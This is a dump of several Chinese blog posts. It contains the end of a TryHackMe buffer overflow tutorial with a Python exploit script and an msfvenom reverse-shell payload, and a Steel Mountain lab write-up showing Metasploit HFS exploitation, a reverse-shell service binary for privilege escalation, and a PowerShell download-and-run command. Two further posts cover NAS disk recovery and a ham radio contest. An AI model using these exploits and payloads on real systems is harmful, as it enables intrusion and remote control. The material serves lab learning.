t0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9&quot; postfix = &quot;&quot; buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(&quot;Sending evil buffer...&quot;) s.send(bytes(buffer + &quot;\\r\\n&quot;, &quot;latin-1&quot;)) print(&quot;Done!&quot;) except: print(&quot;Could not connect.&quot;) 执行他，程序崩溃了，预期行为。然后在调试器的命令栏中输入这些。 12# 2400 是我们创建的固定序列的长度 !mona findmsp -distance 2400 !mona findmsp: 这是 Mona 插件的一个核心命令，用于帮助你找到内存中的溢出位置。它主要用来计算从缓冲区起始位置到 EIP 寄存器的精确偏移量。Mona 会读取当前 EIP 的值，然后在这个值中搜索之前由 pattern_create.rb 生成的模式。 -distance 2400: Mona 会根据当前 EIP 中被覆盖的值（这是一个模式字符串的片段），在这个 2400 字节的模式字符串中查找这个片段，然后计算出它相对于模式字符串起始位置的偏移量。这个偏移量就是你需要填充的垃圾数据（As 或其他占位符）的长度，才能恰好覆盖到 EIP。 让我们记录下这个偏移值，也就代表在 1978 其后的 4 个字节，就是 EIP 的寄存器的位置了。 然后就是测试这个 offset 能用不，脚本中的 offset 设置成上面记下来的值，把之前脚本中的 payload 删掉（nano 编辑器剪切行是 CTRL+K），把 retn 设置成 “ABCD”，这个 “ABCD” 就是假的 EIP 要执行的地址，这里我们只是测试一下，看看 EIP 的值会不会变。 可以看到 EIP 变成我们想要的了，44 43 42 41 即反转的 ABCD，为什么这样，因为 x86-x64 架构都用的小端序。 找坏字符1234# 这段代码是生成 bytearray # -b 参数是排除掉生成这样的字符 # 这里排除掉了 \\x00 即空字节 !mona bytearray -b &quot;\\x00&quot; 然后用一个 python 脚本生成一段 bytearray 123for x in range(1, 256): print(&quot;\\\\x&quot; + &quot;{:02x}&quot;.format(x), end=&#39;&#39;) print() 把这段代码生成的东西放在之前的 python 脚本中的 payload 字段里面。 123456789101112131415161718192021222324import socket ip = &quot;10.10.3.91&quot; port = 1337 prefix = &quot;OVERFLOW1 &quot; offset = 1978 overflow = &quot;A&quot; * offset retn = &quot;ABCD&quot; padding = &quot;&quot; payload = &quot;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff&quot; postfix = &quot;&quot; buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(&quot;Sending evil buffer...&quot;) s.send(bytes(buffer + &quot;\\r\\n&quot;, &quot;latin-1&quot;)) print(&quot;Done!&quot;) except: print(&quot;Could not connect.&quot;) 好，这样做了之后，再去服务器那边把程序打开，这边执行。 现在就要注意 ESP 寄存器的地址了。ESP 寄存器是栈的顶部指针，这里就不多赘述了，你可以把他理解他是一个临时存放数据的地方就行。 这段代码的作用是通过本地生成的 bytearray 和 ESP 中的 bytearray 相比对，找到错误的字符。 1!mona compare -f C:\\mona\\oscp\\bytearray.bin -a 019EFA30 可以看到这里会有这几个会出错的值 00 07 08 2e 2f a0 a1，让我们删掉那些会出错的值，再生成一版来比对一下。 12345# 这个是去掉预定义的会出错的字符串 !mona bytearray -b &quot;\\x00\\x07\\x08\\x2e\\x2f\\xa0\\xa1&quot; # 这是改好的 payload payload = &quot;\\x01\\x02\\x03\\x04\\x05\\x06\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff&quot; 好，这下一模一样了，没出错。OK，下一步。 Tips：一般一个出错的字符，他后面跟着错那个字符应该是好的。但是也不确定，也有可能是两个都会出错，可以用排除法解决。 找合适的跳转地址为什么要找到这个跳转地址呢，我们之前不是能控制 EIP 了嘛，现在需要一个地址，他的行为是能够跳转到 ESP 那里，这就是 JMP ESP。我们的 shellcode 不是在 ESP 那儿吗，这样做就能保证执行我们的 shellcode。 为什么不写死地址呢，因为每次执行溢出的时候，我们的代码段可能不会在硬编码的那儿，但是 JMP ESP 能保证每次跳转的都是在那儿，所以能稳定的触发 shellcode。 让我们找到一个跳板地址，并且这个地址不会被坏字符破坏。 12# 查找指向 ESP 的跳转指令，过滤含指定地址的字符 !mona jmp -r esp -cpb &quot;\\x00\\x07\\x08\\x2e\\x2f\\xa0\\xa1&quot; 出来这么多，原文让我们随便挑一个，构造好的如下，注意是小端序。 1retn = \\xaf\\x11\\x50\\x62 生成马123# 用这行命令生成 # -b 是排除掉坏字符 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.141.2 LPORT=4444 EXITFUNC=thread -b &quot;\\x00\\x07\\x08\\x2e\\x2f\\xa0\\xa1&quot; -f c 1234# 把生成好的直接复制过来丢到 payload 就行，记得加上括号 payload = (&quot;你&quot; &quot;的&quot; &quot;马&quot;) 准备无操作字节（NOPs）NOPs 的主要作用是为编码后的 Shellcode 提供必要的解包空间和稳定性，这个作用就是字面意思。 1padding = &quot;\\x90&quot; * 16 顺利上线 结束简单画了个图，便于理解。","categories":[{"name":"THM","slug":"THM","permalink":"https://blog.irec.moe/categories/THM/"}],"tags":[{"name":"栈","slug":"栈","permalink":"https://blog.irec.moe/tags/%E6%A0%88/"}]},{"title":"Try Hack Me - Steel Mountain","slug":"THM/20250705_Steel_Mountain/Steel_Mountain","date":"2025-07-04T16:00:00.000Z","updated":"2025-07-07T17:54:09.924Z","comments":true,"path":"/thm_steelmountain.html","permalink":"https://blog.irec.moe/thm_steelmountain.html","excerpt":"","text":"0x0Room：https://tryhackme.com/room/steelmountain 这个房间可以说是我在 TryHackMe 上碰到的第一个需要用很多自己想法才能过的房间，其实别人也有很多题解的，但是每个人有不同的解法嘛，并且我觉得我把这个做出来之后感觉很有意思，也学了很多。 0x1刚开始就来了一个看不懂的题目，在这里卡了很久。 Who is the employee of the month? 去搜了一下知道是那个替罪羊，但是我就不知道问题是怎么和这个题目联系上的，直到访问了这个服务器的 IP 之后才发现，hhhh。 0x2就常规扫端口呗，nmap 一把梭。 1234567891011121314151617nmap -sV 10.10.208.117 -T4 # PORTSTATE SERVICE VERSION # 80/tcp open http Microsoft IIS httpd 8.5 # 135/tcp open msrpc Microsoft Windows RPC # 139/tcp open netbios-ssn Microsoft Windows netbios-ssn # 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds # 3389/tcp open ms-wbt-server Microsoft Terminal Services # 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) # 8080/tcp open http HttpFileServer httpd 2.3 # 49152/tcp open msrpc Microsoft Windows RPC # 49153/tcp open msrpc Microsoft Windows RPC # 49154/tcp open msrpc Microsoft Windows RPC # 49155/tcp open msrpc Microsoft Windows RPC # 49156/tcp open msrpc Microsoft Windows RPC # 49163/tcp open msrpc Microsoft Windows RPC # Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 题目问有另外一个端口跑着 HTTP 服务，试着访问一下 8080 看看。 12345http://10.10.106.44:8080/ HttpFileServer 2.3 Server time: 7/4/2025 8:42:11 AM Server uptime: 00:12:54 哟，这不是 HFS 吗，是 2.3 版本，应该是有洞的。 123456789101112$ searchsploit hfs 2.3 ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- HFS (HTTP File Server) 2.3.x - Remote Command Execu | windows/remote/49584.py HFS Http File Server 2.3m Build 300 - Buffer Overfl | multiple/remote/48569.py Rejetto HTTP File Server (HFS) - Remote Command Exe | windows/remote/34926.rb Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary | multiple/remote/30850.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Comma | windows/remote/34668.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Comma | windows/remote/39161.py Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Rem | windows/webapps/34852.txt ---------------------------------------------------- --------------------------------- 题目问我们 CVE 编号是什么，就去 exploit-db 上查查呗。然后看到了这个：https://www.exploit-db.com/exploits/39161，就是这个没错了。 最后一问是让我们去用 msf 利用漏洞去拿 shell，拿到之后 flag 也就在那几个位置呗，轻松秒杀。 1234567891011121314151617181920212223242526search 2014-6287 # exploit/windows/http/rejetto_hfs_exec msf6 exploit(windows/http/rejetto_hfs_exec) &gt; run [*] Started reverse TCP handler on 10.11.141.2:5555 [*] Using URL: http://10.11.141.2:8080/gv4t5KWp [*] Server started. [*] Sending a malicious request to / [*] Payload request received: /gv4t5KWp [*] Sending stage (177734 bytes) to 10.10.208.117 [!] Tried to delete %TEMP%\\cKRtdaA.vbs, unknown result [*] Meterpreter session 1 opened (10.11.141.2:5555 -&gt; 10.10.208.117:49245) at 2025-07-04 13:09:50 -0400 [*] Server stopped. meterpreter &gt; cd &#39;C:\\Users\\bill\\Desktop&#39; meterpreter &gt; ls Listing: C:\\Users\\bill\\Desktop ============================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 282 fil 2019-09-27 07:07:07 -0400 desktop.ini 100666/rw-rw-rw- 70 fil 2019-09-27 08:42:38 -0400 user.txt meterpreter &gt; cat user.txt b04763b6fcf51fcd7c13abc7db4fd365 0x3标题写的是提权，这里其实是用 Windows 的服务的缺陷。 在 Windows 系统中，如果一个服务（Service）的可执行文件路径沒有用双引号完全括起來，且路径中包含空格，就会存在漏洞。 举例来说，如果服务路径是 C:\\Program Files\\My Service\\service.exe 但没有加引号，系统在启动时可能会误以为它要执行的是 C:\\Program.exe 或 C:\\Program Files\\My.exe。 攻击者可以利用这个缺陷，在这些被系统「误读」的位置提前放置一个恶意的同名可执行文件。由于服务通常以高权限运行（如 SYSTEM），当服务下次启动时，就会先执行攻击者的恶意程序，从而实现提权。 这里题目给我们提供了一个叫 PowerUp 的工具，去查看系统里面的可利用点。 123456meterpreter &gt; upload ~/Desktop/tq/PowerUp.ps1 meterpreter &gt; powershell_shell PS &gt; whoami steelmountain\\bill PS &gt; . .\\PowerUp.ps1 PS &gt; Invoke-AllChecks 然后 . .\\xxx 的 . 是 PowerShell 的一个操作符，他的作用是将一个脚本的内容载入并执行到当前 PowerShell 会话的「作用域 (Scope)」中。TBH 我是第一次见到这种用法，也算是涨姿势了。然后 Invoke-AllChecks 是这个脚本的一个函数，后面单独执行这条函数，可以这样来理解。 有一大堆回显，题目告诉我们只要关注 CanRestart 这个参数，然后看看哪个服务的路径没有用引号包裹其他，然后我就找到了这个。 12345678ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubdirectory} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path &lt;HijackPath&gt; CanRestart : True Name : AdvancedSystemCareService9 Check : Unquoted Service Paths 这里就照搬原话吧，意思就是如果 CanRestart 是 True 的话，并且目录可写，我们就可以我们自己的马去替换掉这个服务，然后重启，就上线了。 The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program! 12# 生成反弹 Shell msfvenom -p windows/shell_reverse_tcp LHOST=10.11.141.2 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe 然后就是 upload，放文件，然后就不知道怎么办了。 1meterpreter &gt; upload ~/Desktop/tq/Advanced.exe 其实在这里卡了很久，因为不知道怎么重启这个服务，后面搜了一下，其实这个在房间最后一部分有写的。 12sc stop AdvancedSystemCareService9 sc start AdvancedSystemCareService9 顺利拿到 flag 123456789└─$ nc -lvnp 4443 listening on [any] 4443 ... connect to [10.11.141.2] from (UNKNOWN) [10.10.106.44] 49285 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;cd c:\\Users c:\\Users\\Administrator\\Desktop&gt;type root.txt type root.txt 9af5f314f57607c00fd09803a587db80 0x4第四部分呢，题目的用意就是让我们不要依赖 MSF，去下别人的 EXP 来利用，锻炼这个能力，说实话这个比第三问简单很多。 这里用的是 HFS 的洞，我还经常用这个来建文件共享来着呢，不过一般在内网用，这个作者做的新版 HFS 又不好用。 EXP 地址：https://www.exploit-db.com/exploits/39161 注意脚本要用 python2 执行，把里面的 ip_addr 和 local_port 改成你自己的，然后要起一个 HTTP 服务器，这里我用的 Python。记得要把下载好的 netcat.exe 改名成 nc.exe。 12└─$ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 脚本要执行两次，第一次是下 nc.exe ，第二次才是反弹 Shell，同样记得本地监听一下反弹的端口。 12345678└─$ nc -lvnp 5566 listening on [any] 5566 ... connect to [10.11.141.2] from (UNKNOWN) [10.10.106.44] 49323 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&gt;whoami whoami steelmountain\\bill 这里题目就要我们用一个叫 winPEAS 的工具来收集系统的信息，用来判断系统的可注入点。我依然用之前起的 Python HTTP 服务端用来传文件。 1powershell -c &quot;Invoke-WebRequest -Uri http://10.11.141.2/winPEASx64.exe -OutFile C:\\Users\\Public\\winPEASx64.exe; C:\\Users\\Public\\winPEASx64.exe&quot; 这个工具能显示的非常非常多，看不过来了都。他意思是让我们利用里面发现的注入点，我懒懒就没有去研究了。 后面问了一个如何用 PowerShell 获取服务名字，这不是基操吗？ 1powershell -c &quot;Get-Service&quot; 0xff做完这个 Room，感觉收获很大，本来这个原文是做的小抄的，但是一下记了挺多东西的，想了想不如写一个 Writeup 了，就有了这篇文章。","categories":[{"name":"THM","slug":"THM","permalink":"https://blog.irec.moe/categories/THM/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://blog.irec.moe/tags/Windows/"}]},{"title":"灵车固态炸了整台群晖","slug":"硬件/20250203_黑群晖系统盘爆炸恢复记录/黑群晖系统盘爆炸恢复记录","date":"2025-02-02T16:00:00.000Z","updated":"2025-07-07T17:19:51.352Z","comments":true,"path":"/ssd_boom_dsm.html","permalink":"https://blog.irec.moe/ssd_boom_dsm.html","excerpt":"","text":"0x0 警告2024年1月27日早上收到了 NAS 发过来的邮件推送，那时候我还正熟睡，起来之后看到邮件后并没有觉得有什么事情，下午登录进去之后发现 SSD 掉了，那就重启一下吧。 关机等了一会，给他开机，等了很久很久很久（10min+），还没进系统，接了个 HDMI 采集卡看了一下引导成功了，然后就接到了第一张图的那封邮件。进他的 Web 界面很卡很卡，我在想这是怎么了，SSD 都这么卡吗，然后果断关机。给这块 SSD 接电脑上看了看。 0x1 硬盘爆炸接上电脑用 CDI 看了看他的 SMART，没看到有异常。算了一下 PE 数 74986 &#x2F; 256 ≈ 293 PE，还好？ 然后给整盘做镜像，这时候就发现速度不对了，只有 30M&#x2F;s，那行，等你慢慢做完。 然后我正好有一块同型号的灵车硬盘，在我的软路由里，拆了他取出来准备做一下克隆，顺便看了一下 SMART 情况，还好。 0x2 尝试保留数据迁移硬盘参考了一下网上的教程，想保留数据迁移硬盘，踩坑很多很多，就不详细叙述了，简单总结一下我尝试过的方法。 使用扇区到扇区对拷硬盘 提示配置丢失，需要重装 使用系统内组 RAID 1 的方法恢复单独插另一块做好 RAID 的盘，提示配置丢失，需要重装两块盘一起插，提示配置丢失，需要重装原硬盘盘位不对，提示配置丢失，需要重装单独插原硬盘盘位插回去 提示配置丢失，需要重装单独插原硬盘盘位插回去 拔出其他所有盘，能开机 在此期间等的时间很久很久，等他同步一次数据和克隆硬盘都要2h以上，那个没坏的硬盘也是个垃圾货。 这里测试结果不代表不能以这种方式更换系统盘，我猜是因为我那块盘变成只读状态了，导致没法这样操作。 坑还有群晖在硬盘出现问题后会自动触发数据清理，这个时候碰上这种盘根本没法操作任何东西，IO直接爆了。 在后面系统会直接卡死什么也做不了，所以我要在他开机之后马上去停止掉他这个数据清理。 直接在存储管理器暂停计划是没有用的，必须要在计划数据清理里面把启用数据清理计划的勾去掉，才能关掉他在运行的数据清理。 0x2 放弃在后面直接没办法了，反正所有数据都有备份，直接重装整个 DSM，顺便把引导也更新到了7.2.1，是最后一个官方支持 AME 的版本。 从群晖系统盘恢复 VMM对于我来说，NAS 的作用更多体现在 Server 上，所以我 VMM 上跑了一些虚拟机。Docker 的话则好办，数据目录是分离的并且我也做好了备份，重新拉一下镜像部署一下就恢复了。而 VMM 则麻烦很多，看到 Reddit 的一个帖子 How can I recover synology VMs in a disaster? 。 There are no real VMM backup solutions, except by backing up all data from inside the VM. This makes VMM virtually useless for serious business use. 看到这我瞬间寒心了，然后想了想既然是 VM 那肯定有 VHD。这篇帖子、另一篇有提到 VMM 的虚拟磁盘存放位置。 &#x2F;volume#&#x2F;@iSCSI&#x2F;LUN&#x2F;VDISK_BLUN is the directory that houses the GUIDs…that house the disk files named by UUID. 所以我用 UFS Explorer Professional Recovery ，打开备份出来的的整个硬盘镜像。 可以看到有一个 233G 的 btrfs 分区，打开之后发现根目录都是 Docker 容器生成的文件夹，打开来看亦是。 找到 @iSCSI&#x2F;LUN&#x2F;VDISK_BLUN 打开看发现是空的，然后发现根目录有类似 UUID 一样的文件夹，打开一看，好家伙这不就是么。 vdisk.xxxx 静静的躺在里面，导出来一看正是我 VMM 里面虚拟机之一。为什么有那么多是因为我开了快照，里面有不同版本的很多个 vdisk，找了一下把各个虚拟机的修改日期最新的 vidsk 导出来，然后用 V2V 转成 VMDK，再导入新的 VMM 里面（此处省略步骤），完美恢复。 0x3 更换 S3610在小黄鱼买了一块 S3710 480G ，花了 180CNY（2025年2月），使用组 RAID1 再降级的方式更换硬盘，参考教程 五步操作将群晖RAID1阵列降级为Basic模式。 很顺利，最后手动扩充一下存储池，大功告成。 剩下的就是一些套件设置和用户恢复了，还好群晖用户数据是放在存储池下的 homes 目录里面，这样迁移机器保留硬盘不会丢数据，只需要重新建立一下用户就行。 而 Docker 因为我有把单独的数据目录备份，直接 pull 最新的镜像，重新配置一下存储空间和端口映射就完事了。 0x4 后记远离灵车硬盘！远离灵车硬盘！远离灵车硬盘！ 灵车拿来玩玩或是当 Steam 硬盘可以，但是像我这样把他当成主力盘用的话，真的可能就数据火葬场了，这是我第一次碰到在用的硬盘爆炸的，把我折腾不轻（以前是玩坏的，多写几轮直接暴毙那种，坏了就垃圾桶）。 我的数据都有备份，但是重新配置是真的折磨人。我买 S3610 也是看中了他的传家宝特性，希望能活久一点，不希望再有下一次了。","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"群晖","slug":"群晖","permalink":"https://blog.irec.moe/tags/%E7%BE%A4%E6%99%96/"},{"name":"硬盘","slug":"硬盘","permalink":"https://blog.irec.moe/tags/%E7%A1%AC%E7%9B%98/"},{"name":"灵车","slug":"灵车","permalink":"https://blog.irec.moe/tags/%E7%81%B5%E8%BD%A6/"}]},{"title":"BH7FBP 2024 CQWW SSB SOSB LP 10m 比赛记录","slug":"无线电/BH7FBP_2024_CQWW_SSB_SOSB_LP_10m","date":"2024-12-10T04:00:00.000Z","updated":"2024-12-10T20:53:34.563Z","comments":true,"path":"/cqwwssb2024.html","permalink":"https://blog.irec.moe/cqwwssb2024.html","excerpt":"","text":"背景2021 年，我接触了业余无线电。但我的实际活动是从今年也就是 2024 年开始的，年初有幸认识到岳阳本地的友台，BG7HTS 送了一根 UV 八木天线，BD7BS 送了两根鱼竿，从此开始我的业余无线电生涯。 3 月通过 BG6HNY 帮助注册了 QRZ 和 LOTW，4 月开始打星，6 月开始玩短波，按捺不住想拥有一台自己的短波机，托朋友从日本带了一台 IC-7300，对于那时候还是学生的我来说，钱包大出血：(。 等电台来的路上就是开始研究各种除电台之外的配件咯，看了看市面上成品的配件真的好贵，对于没收入的我来说太贵太贵了。刚好自己喜欢动手，就 DIY 了电池组、GP 天线给短波做准备。电池组是 PDD 砸金蛋 5 折买的力神 40LA，3 串，后面改成 4 串了，折腾过程在这里。GP 天线则是 5.6m 的拉杆 + CNC 切的底座 + 高压绝缘子攻丝 + 镀锌管钉 + 16P 软排线 + 香蕉插头插座，里面的就拉杆和软排线最贵，39+12。 机器到了之后反而没时间玩了，因为即将毕业，要搞毕设之类的，忙成狗~ 上图是最后一次在学校野架。 后来忙完毕业的事宜，在等待工作的间隙中，一根 GP 天线挂窗台干了 2 个月，拿到了 DXCC 100。 9 月，接触除 GP 天线之外的天线制作。从成品巴伦+旧电线在自家阳台上架了一个倒 V，被低底噪惊艳到，从此打开了 DP 的大门。第一根正 V 天线利用 BD7BS 送的鱼竿，自己画了一个适配的底座，实战效果很棒。 老是往外跑太折腾人了，就研究端馈天线，计划在两栋楼之间架设。但是看到成品的巴伦太贵，就开始研究巴伦，买了一堆磁环。 同样也是通过 BD7PRC 引导，开始玩 6m ，从 BG7XWF 那里买了一根八木天线，看到了他的做法，准备也用它那种铝管套接 + 管夹的做法来做天线，然后 DIY 了一根 6m - 10m 的正 V 天线，现在仍在阳台服役。 上图为自己设计的固定底板。 此次参赛也属于机缘巧合，还是从 BD7PRC 那里得知会举行 SSB 的全球性的比赛，我从来没参加过这种比赛，对我来说很陌生，也充满着挑战性 。比赛不仅对于我这种只在菜市场通联过的人是一种挑战，同时也能锻炼我的能力（事实证明确实真的锻炼到了)。比赛是能很好地检验自己的通讯基础设施和能力的，刚好自己在研究天线，对于我来说是一次很好的锻炼机会。 备赛期间10月20号跟我父亲详聊了一下，告诉了他这件事，表示支持并且询问了我需要什么样的场地，我说人烟稀少，场地开阔，远离城市。准备带我去本地的双桥水库，我带了 GP 和 EFHW 去测试一下底噪。 实际上测试效果还可以，这是用 GP 天线测出来的底噪，P2 指的是 2 级前放，OVF 指的是过载，可能是附近有强干扰源。 12345678910160m P2 S0 80m P2 S3 40m P2 S4 30m S3 20m S5 17m S2 15m S4 OVF 12m P2 S3 OVF 10m P2 S2 OVF 6m P2 S0 把 GP 架起来做了几个 QSO，通联了 BD3UDA、BD7NIG、BD4QB、BI8FRF、BD4UBG 几位老师，收他们的信号都非常好，全部都是 59，他们给我的信号报告从 59 到 45，感觉还可以，通联的比较顺利没有拉扯。 后来去水库旁边的堤坝上面架了一个端馈天线，挂了一下 FT8 ，玩了玩自己在家玩不了的 40m 波段，测试起来效果一般，振子线偏长了，另外架设高度也偏低，只有 15m 波段驻波比较好。 太阳消失，妖风作祟，正好母亲打电话来了，收拾战场回家。 坐摩托回去的路上被风吹得头疼，在抉择是否参加这次比赛，如果我真的参加的话，对于我来说太艰苦了，再加上天气也不好，搞的人生病了就不好说了。回去和母亲说了一下，母亲说要不去他同事家里，有电有水有饭吃，那我一拍即合。行，麻烦了。第一次用正 V 天线野架就是在那边，底噪很优秀，就是路不太好走。 10月21号去 BA5CW 的网站和 HelloCQ 论坛上看了看前辈们的参赛经验以及注意事项，阅读了 CQWW SSB 的比赛规则，参考了 BG2FFJ 的教程 把电脑的 N1MM 配好，之后越想越不对，我套天馈参加比赛是否有点太烂了，现有的只有 EFHW、GP、DP 这三种类型的天线，想整个 2 单元的八木，去老外的网站上看了看相关的文章，突然在 POTA 群 BG2BFG 发了一张图。 这是 BG8AMG 设计的用拉杆天线做的八木，我看了看视频，里面绝大部分的配件我有，就意味着我可以用非常小的开支造一条能用的八木天线出来，然后拟定了一张 BOM 表。 名称 数量 价格 型材 2020 1.8mm厚 1m长 2 18.82 双头内螺纹圆柱 18 * 30 * M10 1 0.27 铝型材一字连接件 欧标20型-M5+顶丝4个 4 3.01 304滑块 欧标 20-M6 5 1.56 内六角螺丝 M6*10 10 0.52 骑马扣 18φ 5 0.56 骑马扣 40φ 5 2.97 拉杆 5.6m 1 47.53 以下为现有的 巴伦 1:1 1 拉杆 5.6m 3 绝缘子 40φ 1 之后在淘宝上火速下单，等待到货，另外还买了个蛋卷桌~ 10月22号-10月25号这期间在通过 FT8 研究传播规律，最终波段敲定 10m，因为传播也很有规律，早上6点30左右太阳快出来的时候传播逐渐变强，中午远距离 DX 消失，到傍晚又渐强，直到深夜只有几个稀稀拉拉的信号。 多波段就不参与了，这样能保证有足够的时间休息，刚开始还是不要搞强度那么大，怕身体吃不消。后续证明我选择也对了，10m 传播爆了。 10月23日，通过 BG7JAF 的指导，用之前断掉的镀银馈线做了一个 1:1 的电流型巴伦，测试出来的指标很好。 买的馈线和 M 头也到了，可恶的卖家少发了一个 M 头，还好我还有一个，正好用上了。 在10月23号的时候，感觉买的铝型材到不了了，卖家还没发货，遂跟父亲说了这件事，让他带我去当地的建材市场去找找有没有卖的，俩人寻觅了2小时，无功而返。然后在网上买了另一家的型材。好在快递给力，在最后一天（10月25日）的下午，到货了，到家试着组装了一下，可行！ 比赛前夜仔细阅读了一下比赛规则，再次确认软件配置没问题。 